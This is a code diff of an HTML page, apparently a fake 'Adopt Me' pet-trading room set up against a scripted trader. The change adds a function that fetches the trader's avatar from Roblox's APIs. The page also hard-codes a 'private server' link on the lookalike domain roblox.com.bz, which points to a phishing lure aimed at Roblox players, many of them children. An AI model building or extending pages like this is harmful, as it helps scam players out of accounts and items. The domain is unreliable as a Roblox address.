@@ -69,7 +69,7 @@ body.dedicated #trade-page,body.dedicated #trade-page[hidden]{display:block!impo
 <section class="section" id="game"><div class="section-head"><div><div class="eyebrow">01 / GAME</div><h2>Choose your game</h2></div><span class="muted">Game yang tersedia</span></div><button class="game-card" id="enter-adopt" type="button" style="width:100%;text-align:left"><img src="https://pbs.twimg.com/media/HDew0ydbEAARB_J.jpg" alt="Adopt Me"><div class="game-shade"></div><div class="game-copy"><span class="tag">OPEN GAME</span><h3>Adopt Me Trading ↗</h3></div></button></section>
 <section class="section panel" id="trade-history"><div class="section-head"><div><div class="eyebrow">TRADE LOG</div><h2>Trade History</h2></div><span class="muted" id="history-count">0 trades</span></div><div id="history-list" class="muted">Belum ada trade selesai.</div></section>
 <section class="section panel" id="trade-page" hidden>
-<div class="trade-top"><div><div class="eyebrow">02 / ADOPT ME TRADE ROOM</div><h2>Trading with <span id="target-name">CRAZYMADDOG01</span></h2></div><button class="btn" id="back">← Dashboard</button></div><div class="trader-card selected trader-profile"><span class="avatar"><img class="roblox-avatar nxAvatarFix" src="/assets/crazymaddog01.webp" width="96" height="96" loading="eager" decoding="sync" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/openjpm345-arch/NEXORA/main/assets/crazymaddog01.webp'" alt="CRAZYMADDOG01 avatar"></span><span><span class="trader-name">CRAZYMADDOG01</span><br><span class="trader-sub">Adopt Me Trader</span></span></div>
+<div class="trade-top"><div><div class="eyebrow">02 / ADOPT ME TRADE ROOM</div><h2>Trading with <span id="target-name">CRAZYMADDOG01</span></h2></div><button class="btn" id="back">← Dashboard</button></div><div class="trader-card selected trader-profile"><span class="avatar"><img class="roblox-avatar nxAvatarFix" src="/assets/crazymaddog01.webp" width="96" height="96" loading="eager" decoding="sync" onerror="loadTraderAvatar(this)" alt="CRAZYMADDOG01 avatar"></span><span><span class="trader-name">CRAZYMADDOG01</span><br><span class="trader-sub">Adopt Me Trader</span></span></div>
 <div class="trade-board">
 <div class="offer-panel"><div class="offer-head"><strong>YOUR OFFER</strong><span class="status" id="my-count">0 / 9 ITEMS</span></div><div class="slots" id="my-slots"></div><div class="value-row"><span>Estimated offer points</span><b id="my-value">0</b></div></div>
 <div class="offer-panel"><div class="offer-head"><strong id="bot-title">CRAZYMADDOG01</strong></div><div class="slots" id="bot-slots"></div><div class="value-row"><span>Offer points</span><b id="bot-value">—</b></div></div>
@@ -88,6 +88,25 @@ body.dedicated #trade-page,body.dedicated #trade-page[hidden]{display:block!impo
 const PRIVATE_SERVER_URL="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=54619176604524710586824721253900";
 let pets=[];
 let selectedTrader="CRAZYMADDOG01",myOffer=[],botOffer=[],filter="All";
+async function loadTraderAvatar(img){
+ if(!img||img.dataset.robloxTried)return;
+ img.dataset.robloxTried="1";
+ try{
+  const response=await fetch("https://users.roblox.com/v1/usernames/users",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({usernames:["CRAZYMADDOG01"],excludeBannedUsers:false})});
+  if(!response.ok)throw new Error("username lookup failed");
+  const userData=await response.json(),user=userData.data&&userData.data[0];
+  if(!user||!user.id)throw new Error("username not found");
+  const thumbResponse=await fetch("https://thumbnails.roblox.com/v1/users/avatar?userIds="+user.id+"&size=150x150&format=Png&isCircular=false");
+  if(!thumbResponse.ok)throw new Error("thumbnail lookup failed");
+  const thumbData=await thumbResponse.json(),url=thumbData.data&&thumbData.data[0]&&thumbData.data[0].imageUrl;
+  if(!url)throw new Error("thumbnail unavailable");
+  img.onerror=null;img.src=url;
+ }catch(error){
+  img.onerror=null;
+  img.alt="Avatar CRAZYMADDOG01 tidak dapat dimuat";
+  img.style.background="#29283a";
+ }
+}
 const $=id=>document.getElementById(id),sum=a=>a.reduce((n,p)=>n+p.value,0),pet=n=>pets.find(p=>p.name===n);
 function image(p){let fallback=p.img.replace("https://ironbabatekkral.github.io/adoptme-values/","https://raw.githubusercontent.com/ironbabatekkral/adoptme-values/main/");return '<img class="pet-img" src="'+p.img+'" alt="'+p.name+'" loading="lazy" onerror="if(!this.dataset.fallback){this.dataset.fallback=1;this.src=\''+fallback+'\'}else{this.style.visibility=\'hidden\'}">'}
 function slots(id,list,remove){$(id).innerHTML=Array.from({length:9},(_,i)=>{let p=list[i];return '<div class="slot '+(p?'filled':'')+'">'+(p?image(p)+'<span class="pet-name">'+p.name+'</span><span class="pet-rarity">'+p.rarity+'</span>'+(remove?'<button class="remove-pet" data-remove="'+p.name+'">×</button>':''):'<span class="slot-empty">＋ Empty</span>')+'</div>'}).join("");}
